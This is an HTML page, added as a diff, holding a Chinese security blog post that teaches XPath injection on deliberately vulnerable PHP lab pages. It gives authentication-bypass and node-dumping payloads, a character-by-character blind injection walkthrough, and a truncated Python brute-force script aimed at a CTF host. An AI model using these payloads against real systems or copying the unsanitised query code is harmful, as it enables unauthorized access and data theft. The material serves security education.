@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        Xpath注入姿势 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">Xpath注入姿势</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/OWASP/" class="post-tag">#OWASP</a>
+  
+    <a href="/tags/Xpath%E6%B3%A8%E5%85%A5/" class="post-tag">#Xpath注入</a>
+  
+
+
+          <span class="post-date">2023-03-17</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XPATH%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text">XPATH注入原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5"><span class="toc-text">常规注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-text">登录绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-text">盲注</span></a></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h1 id="XPATH注入原理"><a href="#XPATH注入原理" class="headerlink" title="XPATH注入原理"></a>XPATH注入原理</h1><p>XPath 注入利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得高权限信息的访问权。</p>
+<p>XPath注入类似于SQL注入，当网站使用未经正确处理的用户输入查询 XML 数据时，可能发生 XPATH 注入，由于Xpath中数据不像SQL中有权限的概念，用户可通过提交恶意XPATH代码获取到完整xml文档数据</p>
+<p>==xPath 没有注释一说，所以构造的 payload 要根据语句进行闭合==</p>
+<h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>加一个 ==’ ;==有下列报错，则可以确定Xpath注入的存在性</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281118327.png" alt="image-20230328111810277"></p>
+<h1 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h1><blockquote>
+<p>这里xpath有一个类似于sqli的’or ‘1’=’1的paylaod</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;]|//*|//*[&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>该paylaod用于访问xml文档的所有节点</p>
+</blockquote>
+<p>index.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">&#x27;t3stt3st.xml&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$xml</span> = simplexml_load_file(<span class="string">&#x27;t3stt3st.xml&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;user/username[@name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27;]&quot;</span>;</span><br><span class="line"><span class="variable">$ans</span> = <span class="variable">$xml</span>-&gt;xpath(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$ans</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$x_value</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;2&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>.<span class="string">&quot;:  &quot;</span> . <span class="variable">$x_value</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>t3stt3st.xml:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span> <span class="attr">name</span>=<span class="string">&#x27;user1&#x27;</span>&gt;</span>user1<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>KEY:1<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span> <span class="attr">name</span>=<span class="string">&#x27;user2&#x27;</span>&gt;</span>user2<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>KEY:2<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span> <span class="attr">name</span>=<span class="string">&#x27;user3&#x27;</span>&gt;</span>user3<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>KEY:3<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span> <span class="attr">name</span>=<span class="string">&#x27;user4&#x27;</span>&gt;</span>user4<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>KEY:4<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hctfadmin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span> <span class="attr">name</span>=<span class="string">&#x27;hctf1&#x27;</span>&gt;</span>hctf<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>flag:hctf&#123;Dd0g_fac3_t0_k3yboard233&#125;<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">hctfadmin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>正常查询： <a target="_blank" rel="noopener" href="http://127.0.0.1/xpath/index.php?user=user1">http://127.0.0.1/xpath/index.php?user=user1</a></p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281117593.png" alt="image-20230328111707536"></p>
+<p><strong>Xpath注入漏洞验证：</strong></p>
+<p>加一个 ‘ ;有下列报错，则可以确定Xpath注入的存在性</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281117325.png" alt="image-20230328111730272"></p>
+<p>构造Xpath注入语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>此时的查询语句为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query=&quot;user/username[@name=&#x27;user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;&#x27;]&quot;;</span><br><span class="line">##1=1为真 &#x27;&#x27;=&#x27;&#x27; 为真，使用or连接，则可以匹配当前节点下的所有user</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281118024.png" alt="image-20230328111849982"></p>
+<p>使用’ or 1=1 or ‘’=’ 只能获取当前节点下的数据，flag不在当前节点中。而这里既然为ctf题目，肯定是需要获取flag的，这里xpath有一个类似于sqli的’or ‘1’=’1的paylaod</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;]|//*|//*[&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>该paylaod用于访问xml文档的所有节点</p>
+<h1 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h1><blockquote>
+<p>任意用户登录，这里登test</p>
+<p>用户名：==test’ or ‘a’=’a==</p>
+<p>密码随意</p>
+</blockquote>
+<blockquote>
+<p>这意味着知道任意用户名即可以该用户身份登录，在已知用户账户名的情况下实现任意用户登录。假若管理员用户未知，如我这里设置的比较奇葩的管理用户名，还可以实现以管理员身份登录吗？我们知道一般数据库中默认第一个用户为管理用户。所以这里类似SQLi 的万能密码，使用如下paylaod实现在管理账户未知的情况下管理员登录：</p>
+<p>==x’ or 1=1 or ‘’=’==</p>
+</blockquote>
+<p>这种相当于拿一个xml文件当数据库了，php拿着传过来的用户名密码用xpath语法去xml文件里找</p>
+<p>login.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">username：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">password：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">&#x27;test.xml&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$xml</span>=simplexml_load_file(<span class="string">&#x27;test.xml&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;xpath(<span class="variable">$x_query</span>);</span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登录成功&quot;</span>;</span><br><span class="line"><span class="variable">$login_user</span> = <span class="variable">$result</span>[<span class="number">0</span>]-&gt;username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you login as <span class="subst">$login_user</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>test.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accounts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>Twe1ve<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>admin@xx.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accounttype</span>&gt;</span>administrator<span class="tag">&lt;/<span class="name">accounttype</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>P@ssword123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>test<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>tw@xx.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">accounttype</span>&gt;</span>normal<span class="tag">&lt;/<span class="name">accounttype</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">accounts</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>xpath盲注适用于攻击者不清楚XML文档的架构，没有错误信息返回，一次只能通过布尔化查询来获取部分信息</p>
+<p><strong>Xpath盲注步骤：</strong></p>
+<ul>
+<li>判断根节点下的节点数</li>
+<li>判断根节点下节点长度&amp;名称</li>
+<li>…..</li>
+<li>重复猜解完所有节点，获取最后的值</li>
+</ul>
+<p>从根节点开始判断：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or count(/)=1  or &#x27;</span><span class="string">&#x27;=&#x27;</span>     <span class="comment">###根节点数量为1</span></span><br><span class="line"><span class="string">&#x27;or count(/*)=1 or &#x27;</span><span class="string">&#x27;=&#x27;</span>   <span class="comment">##根节点下只有一个子节点</span></span><br></pre></td></tr></table></figure>
+
+<p>判断根节点长度为8：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or string-length(name(/*[1]))=8 or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>猜解根节点名称：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/*[1]), 1, 1)=&#x27;</span>a<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/*[1]), 2, 1)=&#x27;</span>c<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">..</span><br><span class="line"><span class="string">&#x27;or substring(name(/*[1]), 8, 1)=&#x27;</span>s<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>猜解出该节点名称为accounts</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or count(/accounts)=1  or &#x27;</span><span class="string">&#x27;=&#x27;</span>   /accounts节点数量为<span class="number">1</span></span><br><span class="line"><span class="string">&#x27;or count(/accounts/user/*)&gt;0 or &#x27;</span><span class="string">&#x27;=&#x27;</span>     /accounts下有两个节点</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;or string-length(name(/accounts/*[1]))=4  or &#x27;</span><span class="string">&#x27;=&#x27;</span>    第一个子节点长度为<span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p>猜解accounts下的节点名称：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/accounts/*[1]), 1, 1)=&#x27;</span>u<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/*[1]), 4, 1)=&#x27;</span>r<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>accounts下子节点名称为user</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or count(/accounts/user)=2  or &#x27;</span><span class="string">&#x27;=&#x27;</span>    user节点有两个，则可以猜测出accounts节点结构，accounts下两个节点，均为user节点</span><br></pre></td></tr></table></figure>
+
+<p>第一个user节点的子节点长度为8：<br>‘or string-length(name(/accounts/user[position()=1]/*[1]))=8 or ‘’=’</p>
+<p>读取user节点的下子节点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 2, 1)=&#x27;</span>s<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 8, 1)=&#x27;</span>e<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>最终所有子节点值验证如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 1)=&#x27;</span>username<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[2]), 1)=&#x27;</span>email<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[3]), 1)=&#x27;</span>accounttype<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[4]), 1)=&#x27;</span>password<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>继续猜解：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or count(/accounts/user[position()=1]/username/*)&gt;0 or &#x27;</span><span class="string">&#x27;=&#x27;</span>   </span><br><span class="line"><span class="string">&#x27;or count(/accounts/user[position()=1]/email/*)&gt;0 or &#x27;</span><span class="string">&#x27;=&#x27;</span> </span><br><span class="line"><span class="string">&#x27;or count(/accounts/user[position()=1]/accounttype/*)&gt;0 or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or count(/accounts/user[position()=1]/username/password/*)&gt;0 or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>均为 false，不再有子节点，则可以尝试读取这些节点的值</p>
+<p>第一个user下的username值长度为6:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or string-length((//user[position()=1]/username[position()=1]))=6  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>读取第一个user下usernaem的值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or substring((//user[position()=1]/username[position()=1]),1,1)=&#x27;</span>T<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">....</span><br><span class="line"><span class="string">&#x27;or substring((//user[position()=1]/username[position()=1]),6,1)=&#x27;</span>e<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可依次读取所有的子节点的值，第二user节点的子节点值读取方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or string-length((//user[position()=2]/username[position()=1]))=4 or &#x27;</span><span class="string">&#x27;=&#x27;</span>  第一个user下的username长度为<span class="number">4</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>重复上边步骤即可</p>
+<p>参考脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url =<span class="string">&#x27;http://47e7790f-8a53-4efa-988b-7a350ebb91d5.node3.buuoj.cn//login.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">head =&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/xml&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">find =re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line"></span><br><span class="line">        r = s.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        payload_1 = <span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        payload_2 = <span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        payload_3 =<span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 